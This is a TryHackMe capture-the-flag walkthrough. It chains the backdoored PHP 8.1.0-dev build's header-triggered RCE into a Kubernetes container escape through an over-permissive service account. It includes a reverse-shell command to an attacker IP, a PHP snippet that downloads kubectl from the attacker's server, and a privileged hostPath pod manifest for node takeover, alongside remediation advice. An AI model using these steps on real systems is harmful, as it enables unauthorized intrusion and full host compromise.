@@ -1,0 +1,216 @@
+---
+title: 'Frank and Herby try again.....'
+description: 'A backdoored PHP 8.1.0-dev build gives unauthenticated RCE inside a Kubernetes pod, and an over-permissive service account lets us schedule a privileged pod that mounts the host filesystem for a full node takeover.'
+date: 2026-01-09
+platform: tryhackme
+room: 'Frank and Herby try again.....'
+roomUrl: 'https://tryhackme.com/room/frankandherbytryagain'
+difficulty: medium
+tags:
+  - 'php'
+  - 'cve'
+  - 'rce'
+  - 'kubernetes'
+  - 'docker'
+  - 'container-escape'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'supply chain backdoor'
+  - 'insecure kubernetes rbac'
+  - 'privileged container escape'
+translation: done
+draft: false
+---
+
+## **Frank and Herby try again..... — A Backdoored PHP Build and a Kubernetes Pod That Owns the Node**
+
+_A walkthrough of TryHackMe's "Frank and Herby try again....." box. A web server runs the infamous backdoored_ _`PHP 8.1.0-dev`_ _build, giving unauthenticated RCE — but it lands us as root_ inside a container*. The container's Kubernetes service account can do anything (\`*._`on every verb), so we smuggle in`\*\*kubectl\`, schedule a privileged pod that mounts the host's root filesystem, and step straight out onto the node._
+
+> The flags and target IP are redacted. This is an authorized training box on TryHackMe; everything here was performed against a legal practice target. Flags are shown as `THM{<redacted>}` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+A web app on a high port runs the **backdoored** **`PHP 8.1.0-dev`** build (the 2021 git-server supply-chain backdoor triggered by a crafted `User-Agentt` header) → **unauthenticated RCE as root inside a container** → `env` reveals Kubernetes service variables, and `kubectl auth can-i --list` shows the pod's token can do **`*.*`** **with verb** **`*`** — total cluster control → `kubectl`/`curl`/`wget` are missing, so we stage `kubectl` by having PHP `file_get_contents` it from our HTTP server → read the node's image name, then `kubectl apply` a **privileged pod** with `hostPID`/`hostNetwork` that **mounts the host** **`/`** **at** **`/host`** → `kubectl exec` into it and read `user.txt` and `root.txt` from the real host filesystem.
+
+Backdoored PHP → RCE in a container → god-mode RBAC → privileged pod mounting host root → node compromise.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+The scan is dominated by Kubernetes control-plane ports (the kubelet on `10250`/`10255`, the API server on `16443`, scheduler/controller on `10257`/`10259`) plus SSH and a PHP dev server:
+
+```text
+22/tcp    open  ssh       OpenSSH 8.2p1 Ubuntu
+10250/tcp open  ssl/http  kubelet (microk8s)
+10255/tcp open  http      kubelet read-only
+16443/tcp open  ssl/http  Kubernetes API server (microk8s)
+30679/tcp open  http      PHP cli server 5.5+ (PHP 8.1.0-dev)  — "FRANK RULEZZ!"
+```
+
+That banner — **PHP 8.1.0-dev** — is the whole first half of the box. A content scan of the dev server confirms a verbose `info.php`.
+
+### **The vulnerability — a backdoor shipped in the PHP source**
+
+In March 2021 the PHP project's own git server was compromised and two malicious commits were pushed that added a backdoor to the `8.1.0-dev` tree: if an incoming request carries a `User-Agentt` header (two t's) beginning with `zerodium`, the rest of the header is executed with `eval()`. Any server built from that tainted source is **unauthenticated RCE for anyone who knows the header**.
+
+<Callout type="insight">
+
+This isn't an app bug — it's a **supply-chain backdoor baked into the interpreter**. The lesson is where the trust broke: the runtime itself was tampered with upstream, so no amount of application review would have caught it. Spotting it is purely a matter of reading the version banner and knowing its history.
+
+</Callout>
+
+### **Step 1 — unauthenticated RCE via the backdoor**
+
+Use any public PoC for the `8.1.0-dev` backdoor (e.g. flast101's) to fire a reverse shell:
+
+```text
+# attacker
+nc -lvnp 4444
+python3 revshell.py http://$IP:30679 $ATTACKER_IP 4444
+```
+
+The shell returns as **root**, but the hostname (`php-deploy-...`) and a quick look at the environment say we're inside a container, not on the host:
+
+```text
+root@php-deploy-6d998f68b9-...:/var/www/html# whoami
+root
+```
+
+### **Step 2 — confirm Kubernetes and check our powers**
+
+`env` leaks the service-account wiring, so this pod talks to a Kubernetes API:
+
+```text
+env | grep -i kuber
+# KUBERNETES_SERVICE_HOST=10.152.183.1
+# KUBERNETES_SERVICE_PORT=443 ...
+```
+
+But `kubectl`, `curl`, and `wget` are all missing from the container. PHP is the one tool we're guaranteed, so we use it to pull `kubectl` from our own HTTP server:
+
+```text
+# attacker: host a kubectl binary
+curl -LO https://dl.k8s.io/release/v1.18.0/bin/linux/amd64/kubectl
+python3 -m http.server 8080
+```
+
+```text
+# in the pod: write a tiny PHP downloader and hit it
+echo '<?php' > foo.php
+echo '    file_put_contents("kubectl", file_get_contents("http://'$ATTACKER_IP':8080/kubectl"));' >> foo.php
+echo '?>' >> foo.php
+# request foo.php once, then:
+cp kubectl /tmp && cd /tmp && chmod +x kubectl
+```
+
+With `kubectl` in hand, check the service account's rights:
+
+```text
+./kubectl auth can-i --list
+# Resources   Non-Resource URLs   Resource Names   Verbs
+# *.*         []                  []               [*]
+```
+
+**`*.*`** **on verb** **`*`** — the pod's token is cluster-admin in all but name.
+
+### **Step 3 — schedule a privileged pod that mounts the host**
+
+We need the node's image name so the new pod schedules cleanly:
+
+```text
+./kubectl get node -o yaml | grep -A2 images
+# docker.io/vulhub/php:8.1-backdoor
+```
+
+Now define a pod that is privileged, shares host namespaces, and **bind-mounts the host root filesystem** into the container at `/host`:
+
+```text
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwned
+  labels:
+    app: pwn
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: pwned
+    image: docker.io/vulhub/php:8.1-backdoor
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
+
+Stage `pwn.yaml` the same way we staged `kubectl` (PHP `file_get_contents` from our HTTP server), then apply it:
+
+```text
+./kubectl apply -f pwn.yaml
+# pod/pwned created
+./kubectl get pods            # pwned ... Running
+```
+
+### **Step 4 — step onto the node and read the flags**
+
+Exec into the privileged pod and walk the host filesystem mounted at `/host`:
+
+```text
+./kubectl exec -it pwned -- /bin/sh
+id                            # uid=0(root)
+cd /host/home/herby && cat user.txt
+# THM{<redacted>}
+cat /host/root/root.txt
+# THM{<redacted>}
+```
+
+The pod's container root is the node's root — the mount erases the boundary between "container" and "host."
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Two independent critical failures chain into full node compromise:
+
+- **A backdoored PHP runtime** gives remote, unauthenticated code execution to anyone who sends the magic header — the interpreter itself is malicious.
+- **A pod service account with** **`*.*`\*\***/\***_`_`** **RBAC** means a single compromised container is cluster-admin. Combined with the right to create **privileged pods with** **`hostPath: /`**, that's a one-command escape onto every node — read any file, run any process, as root on the host.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Never run a** **`-dev`** **or untrusted PHP build in production.** Pin to official release tags with verified checksums/signatures, and rebuild from a known-good source — the `8.1.0-dev` backdoor is a textbook supply-chain compromise.
+2. **Scope service accounts to least privilege.** A web pod needs no Kubernetes API rights at all; `*.*` on `*` should never be bound to a workload token. Disable automount of the default token where it isn't used.
+3. **Enforce Pod Security Admission / admission control.** Reject `privileged: true`, `hostPID`, `hostNetwork`, and `hostPath` mounts for application namespaces so a compromised pod can't schedule a node-escaping sibling.
+
+</Callout>
+
+### **Takeaways**
+
+- **The version banner is the exploit.** `PHP 8.1.0-dev` isn't a CVE in the usual sense — it's a backdoored build, and recognising it is the whole foothold.
+- **Root in a container is not root on the host.** Always check `env`/hostname/`/proc` to learn where you actually are before celebrating.
+- **RBAC is the real attack surface in Kubernetes.** A token that can create privileged pods is equivalent to root on every node, regardless of how hardened the app is.
+- **`hostPath: /`** **+** **`privileged`** **= instant escape.** Mounting the node root into a pod you control collapses the container boundary entirely.
+
+Thanks for reading. Frank and Herby "try again," but the box is really two trust failures stacked: a runtime that was backdoored upstream, and a cluster that handed a web pod the keys to every node.
